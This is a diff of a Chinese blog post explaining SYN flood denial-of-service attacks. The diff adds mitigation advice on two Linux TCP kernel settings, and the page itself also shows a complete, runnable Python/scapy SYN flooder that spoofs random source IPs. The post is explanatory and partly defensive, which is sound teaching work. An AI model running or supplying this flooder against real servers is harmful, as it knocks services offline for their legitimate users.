@@ -105,7 +105,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.loli.net/2019/06/18/5d08956a2dc6a34114.png">
 <meta property="og:image" content="https://i.loli.net/2019/06/18/5d089ef3c46a290479.png">
-<meta property="og:updated_time" content="2019-06-18T14:06:09.317Z">
+<meta property="og:updated_time" content="2019-06-21T09:59:07.705Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DDOS攻击之syn-flood（二）">
 <meta name="twitter:description" content="syn-floodSYN Flood (SYN洪水) 是种典型的DoS (Denial of Service，拒绝服务) 攻击。效果就是服务器TCP连接资源耗尽，停止响应正常的TCP连接请求。 原理说到原理，还得从TCP如何建立连接(Connection)讲起。通信的双方最少得经过3次成功的信息交换才能进入连接全开状态(Full-Open)，行话叫建立TCP连接的3次握手 正常tcp连接 A首先发">
@@ -398,12 +398,24 @@
                 
               
 
-              <time title="创建时间：2019-06-18 15:08:38 / 修改时间：22:06:09" itemprop="dateCreated datePublished" datetime="2019-06-18T15:08:38+08:00">2019-06-18</time>
+              <time title="创建时间：2019-06-18 15:08:38" itemprop="dateCreated datePublished" datetime="2019-06-18T15:08:38+08:00">2019-06-18</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-06-21 17:59:07" itemprop="dateModified" datetime="2019-06-21T17:59:07+08:00">2019-06-21</time>
               
             
           </span>
@@ -476,7 +488,15 @@
 <li><em>（B为帮助A能顺利连接，需要分配内核资源维护半开连接，那么当B面临海量的大忽悠A时)，SYN Flood攻击就形成了。攻击方A可以控制肉鸡向B发送大量SYN消息但不响应ACK消息，或者干脆伪造SYN消息中的Source IP，使B反馈的SYN-ACK消息石沉大海导致B被大量注定不能完成的半开连接占据，直到资源耗尽，停止响应正常的连接请求）</em>括号里面的这是一个完全错误的说法</li>
 </ul>
 <h1 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h1><ul>
-<li>根据自己的实验，被攻击者的cpu和内存并没有多大的变化，syn是沾满了tcp的最大连接池，所以正常用户无法访问，如果大量的SYN包发到服务器端后没有应答，就会使服务器端的TCP资源迅速耗尽，导致正常的连接不能进入，甚至会导致服务器的系统崩溃</li>
+<li>根据自己的实验，被攻击者的cpu和内存并没有多大的变化，syn是沾满了tcp的最大连接池，所以正常用户无法访问，如果大量的SYN包发到服务器端后没有应答，就会使服务器端的TCP资源迅速耗尽，导致正常的连接不能进入，甚至会导致服务器的系统崩溃，并不会因为为了维持当前的半开连接而消耗cpu和内存资源而产生的拒绝服务效果。</li>
+</ul>
+<h2 id="如何应对"><a href="#如何应对" class="headerlink" title="如何应对"></a>如何应对</h2><ul>
+<li><p>最简单粗暴的办法就是提高TCP端口连接容量的同时减少半开连接的资源占用时间。在Linux上可以修改以下配置提高TCP半开连接队列大小的上限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_max_syn_backlog</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以减少半开状态下等待ACK消息的时间或者重试发送SYN-ACK消息的次数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/tcp_synack_retries</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 <p><img src="https://i.loli.net/2019/06/18/5d089ef3c46a290479.png" alt></p>
 <h3 id="syn-flood-python攻击源码"><a href="#syn-flood-python攻击源码" class="headerlink" title="syn-flood python攻击源码"></a>syn-flood python攻击源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#########################################</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># SYNflood - A multithreaded SYN Flooder</span></span><br><span class="line"><span class="comment"># author: arthurnn</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#########################################</span></span><br><span class="line">import socket, random, sys, threading</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 3:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"Usage: %s &lt;Target IP&gt; &lt;Port&gt;"</span> % sys.argv[0]</span><br><span class="line">	sys.exit(1)</span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line"></span><br><span class="line">total = 0</span><br><span class="line">conf.iface=<span class="string">'en1'</span>;<span class="comment">#network card XD</span></span><br><span class="line"></span><br><span class="line">class sendSYN(threading.Thread):</span><br><span class="line">	global target, port</span><br><span class="line">	def __init__(self):</span><br><span class="line">		threading.Thread.__init__(self)</span><br><span class="line">	def run(self):</span><br><span class="line">		i = IP()</span><br><span class="line">		i.src = <span class="string">"%i.%i.%i.%i"</span> % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))</span><br><span class="line">		i.dst = target</span><br><span class="line"></span><br><span class="line">		t = TCP()</span><br><span class="line">		t.sport = random.randint(1,65535)</span><br><span class="line">		t.dport = port</span><br><span class="line">		t.flags = <span class="string">'S'</span></span><br><span class="line"></span><br><span class="line">		send(i/t, verbose=0)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Flooding %s:%i with SYN packets."</span> % (target, port)</span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">	sendSYN().start()</span><br><span class="line">	total += 1</span><br><span class="line">	sys.stdout.write(<span class="string">"\rTotal packets sent:\t\t\t%i"</span> % total)</span><br></pre></td></tr></table></figure>
@@ -543,6 +563,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/19/DDOS攻击之DNS放大攻击（三）/" rel="prev" title="DDOS攻击之DNS放大攻击（三）">
+                DDOS攻击之DNS放大攻击（三） <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -613,7 +637,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">20</span>
+                    <span class="site-state-item-count">21</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -710,7 +734,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#syn-flood"><span class="nav-number">1.</span> <span class="nav-text">syn-flood</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正常tcp连接"><span class="nav-number">3.</span> <span class="nav-text">正常tcp连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不正常连接"><span class="nav-number">4.</span> <span class="nav-text">不正常连接</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#重点"><span class="nav-number"></span> <span class="nav-text">重点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#syn-flood-python攻击源码"><span class="nav-number">0.1.</span> <span class="nav-text">syn-flood python攻击源码</span></a></li></ol></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#syn-flood"><span class="nav-number">1.</span> <span class="nav-text">syn-flood</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正常tcp连接"><span class="nav-number">3.</span> <span class="nav-text">正常tcp连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不正常连接"><span class="nav-number">4.</span> <span class="nav-text">不正常连接</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#重点"><span class="nav-number"></span> <span class="nav-text">重点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#如何应对"><span class="nav-number">1.</span> <span class="nav-text">如何应对</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#syn-flood-python攻击源码"><span class="nav-number">1.1.</span> <span class="nav-text">syn-flood python攻击源码</span></a></li></ol></li></ol></li></div>
             
 
           </div>
